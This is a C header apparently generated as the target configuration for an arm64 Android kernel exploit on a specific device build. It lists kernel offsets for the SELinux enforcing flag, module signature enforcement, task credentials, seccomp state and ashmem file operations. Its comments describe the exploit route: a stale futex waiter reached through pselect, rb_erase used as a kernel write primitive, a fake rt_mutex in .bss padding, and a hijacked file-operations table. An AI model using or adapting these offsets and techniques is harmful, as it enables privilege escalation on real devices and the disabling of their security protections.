/* WARNING: BTF was not available. Struct/layout macros not recovered from this image; values not overwritten above were inherited from template rodin/target.h. BTF error: 有效 vmlinux BTF 候选不唯一: [] */
/* Generated for pfum10c48 from boot.img without BTF; template=rodin. */
#ifndef TARGET_H
#define TARGET_H
#define FOPS_CONFIGFS_READ_OFF FOPS_READ_OFF
#define FOPS_CONFIGFS_WRITE_OFF FOPS_WRITE_OFF

#define BUILD_VARIANT_LABEL "pfum10c48_no_btf"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "unknown"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc010080000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa0080000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
/*
 * arm64 RANDOMIZE_MEMORY moves page_offset_base every boot; the linear map
 * has been observed at +177GiB from PAGE_OFFSET (0xffffffab49928000), far
 * beyond the old 64GiB window.  Cover everything below the observed kimage
 * region (0xffffffe1...) so the real mm_struct is always in range; the cost
 * is only a wider false-positive search, which KSNITCH_COLLISIONS=6 makes
 * negligible (per-candidate FP = (1/2048)^5).
 */
#define KERNELSNITCH_IDENTITY_END 0xffffffe000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffeffe00000ULL

/* Route layout -- BEHAVIOR-PROVEN value, do not "re-derive" from partial
 * static disassembly without checking core_sys_select's allocation first:
 *   pselect word0 (bits) = KSP-0x210 (0x10+0x90+0x1c0 frames, bits@core+0x50)
 *   success runs (exam2 r1/r2/r3, misc.fops write-verified) prove the real
 *   stale waiter S.tree sits at word0 == bits: rb_erase consumed
 *   word0=parent=target-8 / word1=value / word2=0 and stored value into
 *   ASHMEM_MISC_FOPS, so delta really is 0 here.
 * Two static derivations claimed otherwise and BOTH panicked (fix64:
 * S=KSP-0x198/x29-0xc8 site, shift=13; fix65: S=KSP-0x200/Path-B, forced
 * shifted layout) -- but their shared fatal change was nfds=576 moving the
 * fdset off-stack (see common.h): the shift debate was never exercised.
 * A value also must stay within nfds=320's input area word0-14 or the
 * kernel's zero_fd_set(res_*) wipes it; simple+shift0 fits (tree@0..
 * ww_ctx@10).  A stale-waiter guess of word15 (fops.c "core_sp+0xc8"
 * comment) is likewise refuted by those runs -- word15 is res_in[0],
 * zeroed before do_select, which would have been an instant NULL panic. */
#define PSELECT_WAITER_WORD_SHIFT 0
#define MM_STRUCT_SZ 0x3c0
#define KSNITCH_COLLISIONS 6
#define PSELECT_CFI_ROUTE_ATTEMPTS 12
#define PSELECT_CFI_REPREPARE_EVERY 4

#define ASHMEM_MISC_FOPS_OFF 0x2b51d38ULL
#define ASHMEM_FOPS_OFF 0x2b51e08ULL
#define ASHMEM_IOCTL_OFF 0x162434ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x162d5cULL
#define ASHMEM_MMAP_OFF 0x162db0ULL
#define ASHMEM_OPEN_OFF 0x162f38ULL
#define ASHMEM_RELEASE_OFF 0x162fb0ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x1630ccULL
#define CONFIGFS_READ_ITER_OFF 0x5699ccULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x569f04ULL
#define COPY_SPLICE_READ_OFF 0x4f5aa0ULL
#define NOOP_LLSEEK_OFF 0x4ad6f0ULL
#define INIT_TASK_OFF 0x2b6f580ULL
#define INIT_UTS_NS_OFF 0x2b6f308ULL
#define EMPTY_ZERO_PAGE_OFF 0x2e17000ULL
#define ROOT_TASK_GROUP_OFF 0x2e29e70ULL
#define SELINUX_BLOB_SIZES_OFF 0x24fbcccULL
/*
 * selinux_state base is 0x2e16000 (kallsyms) but the enforcing bool sits at
 * +1: sel_fill_super() stores &selinux_state into selinux_fs_info->state
 * (stp x9, x19, [x20, #0x70] at 0x6c10f0), and sel_write_enforce() at
 * 0x6c1f90/0x6c1f96 does ldrb w22,[x21,#0x1] / strb w8,[x21,#0x1] while
 * sel_write_checkreqprot() at 0x6c31f8/0x6c3204 does
 * ldr x9,[x22,#0x70] / strb w8,[x9,#0x2].  Layout: disabled@0,
 * enforcing@1, checkreqprot@2, initialized@3.  All consumers
 * (root.c:386-396, fops.c:565) access a single byte.
 */
#define SELINUX_ENFORCING_OFF 0x2e16001ULL
/*
 * kernel/module.c bool sig_enforce (CONFIG_MODULE_SIG_FORCE default-on;
 * sysfs knob is bool_enable_only so userspace can only enable it).
 * stock kallsyms: sig_enforce ffffffc012c09d20 - _text ffffffc010080000.
 */
#define SIG_ENFORCE_OFF 0x2b89d20ULL
#define PERF_EVENT_PARANOID_OFF 0x2aafff0ULL
#define PERF_EVENT_MLOCK_OFF 0x2aafff4ULL
/*
 * 0x600 bytes of unused .bss alignment padding between __bss_start
 * (EMPTY_ZERO_PAGE_OFF - 0x1600 = 0x2e15a00) and selinux_state
 * (0x2e16000).  No kallsyms symbol falls inside, it is zero-filled .bss,
 * and nothing ever writes it, so it is a safe scratch home for the fake
 * rt_mutex: rb_erase() leaves waiters.rb_node/rb_leftmost dirty at +0x08
 * and +0x10, and doing that in the shared empty_zero_page corrupts every
 * untouched anonymous page (zygote dies, init reboots the phone).
 * The lock only needs 0x20 bytes, so it sits in the middle of the pad.
 */
#define BSS_LOCK_PAD_OFF 0x2e15d00ULL
#define BSS_LOCK_PAD_LIMIT 0x2e16000ULL
#define BSS_LOCK_PAD (KIMAGE_TEXT_BASE + BSS_LOCK_PAD_OFF)
/*
 * rb_erase() dirties lock+0x08 (waiters.rb_node) and lock+0x10
 * (waiters.rb_leftmost), so a slot can only be used once.  The pad gives
 * (0x2e16000 - 0x2e15d00) / 0x40 = 12 disjoint 0x40-byte slots, matching
 * PSELECT_CFI_ROUTE_ATTEMPTS + 4: a failed attempt leaves its slot untouched
 * (the target store is what rb_erase performs, and the target never
 * changed), and a successful attempt stops the route, so every attempt
 * gets a pristine lock and the pselect route can simply retry to 100%%.
 */
#define BSS_LOCK_SLOT_SIZE 0x30ULL
#define BSS_LOCK_SLOTS 32
#define SECURITY_HOOK_HEADS_OFF 0x24fb658ULL
#define KMALLOC_CACHES_OFF 0x24fb1b0ULL
#define ANON_PIPE_BUF_OPS_OFF 0x23d0378ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

#define SLIDE_NFULNL_LOGGER_OFF 0x2aaacf0ULL
#define SLIDE_LOGGERS_0_1_OFF 0x2ab2ee8ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x29e4ab8ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x31313e9ULL

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* Stale-waiter S depth below do_futex's entry sp -- rodin's proven value
 * 0x90, restored after fix64 (0x128, LOCK_PI x29-0xc8) and fix65 (0x190,
 * WAIT_REQUEUE_PI Path-B) both failed to match behavior.  Unused at
 * runtime (target-generation artifact only; fdset layout is driven by
 * PSELECT_WAITER_WORD_SHIFT above), so it cannot cause panics either way. */
#define WAITER_LOCAL_OFF 0x90
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_WAKE_STATE_OFF 0x40
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
#define WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x50
#define FAKE_WAITER_WW_CTX_OFF 0x58
/* task->usage == 0x38
 *  __put_task_struct @0x271a70: `ldr w8,[x19,#0x38]; cbnz -> warn`
 *  (WARN_ON(refcount_read(&tsk->usage))); mm_update_next_owner does
 *  refcount_inc @0x27b33c (`add x22,x21,#0x38` + LL/SC, cbz old -> w1=2
 *  = REFCOUNT_ADD_UAF) and dec -> bl __put_task_struct; ~324 inline
 *  put_task_struct sites decode `add reg,task,#0x38` + LL/SC dec. */
#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
/* task->sched_task_group == 0x3d8
 *  .text stores to [reg,#0x3d8]: sched_move_task @0x2baf2c
 *  (ldr x8,[x22,#0x9e0]; ldr x8,[x8,#8]; str x8,[x22,#0x3d8] where x22=p,
 *   proven by `mov x0,x15; mov x1,x22; bl enqueue_task`) and
 *  cpu_cgroup_fork @0x2bb4f4 (x20=x0=p, guarded by
 *  `add x19,x0,#0x8f4` = &p->pi_lock + _raw_spin_lock_irqsave).
 *  Both are the canonical setters of p->sched_task_group.
 *  Loads: uclamp_eff_value @0x2b2ee0, enqueue_task @0x2b32dc,
 *  cpu_util_update_eff @0x2bc680 -- all `cmp` against
 *  &root_task_group (adrp 0x2e29000 + add #0xe70 => 0x2e29e70).
 *  0x348 is NOT sched_task_group: it is a WALT struct ravg field,
 *  zeroed by init_new_task_load/reset_task_stats/mark_task_starting. */
#define FAKE_TASK_TASK_GROUP_OFF 0x3d8
#define FAKE_TASK_PI_LOCK_OFF 0x8f4
#define FAKE_TASK_PI_WAITERS_OFF 0x900
#define FAKE_TASK_PI_TOP_TASK_OFF 0x910
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x918
/* UNVERIFIED / unused in src/ . c.  uclamp_eff_value actually reads
 * `ldr w9,[x9,#0x4c8]` (base ~0x4c8, stride 4), while 0x350/0x358 fall
 * inside the WALT struct ravg block (0x310..0x3c8). */
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#define FAKE_TASK_UCLAMP_OFF 0x358

#define CFG_PAGE_OFF 0x10ULL
#define CFG_NEEDS_READ_FILL_OFF 0x48ULL
#define CFG_BIN_BUFFER_OFF 0x50ULL
#define CFG_BIN_BUFFER_SIZE_OFF 0x58ULL
#define CFG_CB_MAX_SIZE_OFF 0x5cULL
/* struct mm_struct->owner == 0x338 (unused in src/)
 *  mm_update_next_owner(x0=mm): `ldr x8,[x0,#0x338]` @0x27b21c (read),
 *  `str xzr,[x19,#0x338]` @0x27b3e4 (owner=NULL),
 *  `str x21,[x19,#0x338]` @0x27b40c (owner=p). */
#define MM_OWNER_OFF 0x338
#define TASK_PID_OFF 0x650
#define TASK_TGID_OFF 0x654
#define TASK_REAL_PARENT_OFF 0x660
#define TASK_ATOMIC_FLAGS_OFF 0x618
#define TASK_REAL_CRED_OFF 0x800
#define TASK_CRED_OFF 0x808
#define TASK_COMM_OFF 0x818
#define TASK_TASKS_OFF 0x550
#define TASK_SECCOMP_OFF 0x8d0
#define CRED_UID_OFF 0x4
#define CRED_SECUREBITS_OFF 0x24
#define CRED_CAPS_OFF 0x28
#define CRED_SECURITY_OFF 0x78
#define SECCOMP_MODE_OFF 0x0
#define SECCOMP_FILTER_COUNT_OFF 0x4
#define SECCOMP_FILTER_OFF 0x8
#define TASK_THREAD_INFO_FLAGS_OFF 0x0
#define SELINUX_CRED_BLOB_OFF 0x0
#define SELINUX_CRED_OSID_OFF 0x0
#define SELINUX_CRED_SID_OFF 0x4
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x8
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_INODE_INFO_STRUCT_SIZE 0xb8
#define PIPE_INODE_INFO_SIZE 0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF 0x60
#define PIPE_TAIL_OFF 0x64
#define PIPE_MAX_USAGE_OFF 0x68
#define PIPE_RING_SIZE_OFF 0x6c
#define PIPE_NR_ACCOUNTED_OFF 0x70
#define PIPE_READERS_OFF 0x74
#define PIPE_WRITERS_OFF 0x78
#define PIPE_FILES_OFF 0x7c
#define PIPE_TMP_PAGE_OFF 0x90
#define PIPE_BUFS_OFF 0xa8
#define PIPE_USER_OFF 0xb0

#define FOPS_OWNER_OFF 0x0
#define FOPS_LLSEEK_OFF 0x8
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_POLL_OFF 0x48
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_MMAP_FLAGS_OFF 0x68
#define FOPS_OPEN_OFF 0x70
#define FOPS_FLUSH_OFF 0x78
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0
#define FOPS_TABLE_BYTES 0x110

/* .data words pulled through the post-hijack configfs read primitive
 * (ks_layout_measure_cfgfs): physvirt_offset (pvo; la0 = -pvo), vmemmap,
 * memstart_addr.  Offsets extracted offline from the stock C.48 boot.img
 * kallsyms (tools/vendor generator anchors do not match this build;
 * see /tmp/opencode/lookup_pvo.py history). */
#define MEMSTART_ADDR_OFF 0x24fb048ULL
#define PHYSVIRT_OFFSET_OFF 0x24fb050ULL
#define VMEMMAP_OFF 0x24fb058ULL

#endif
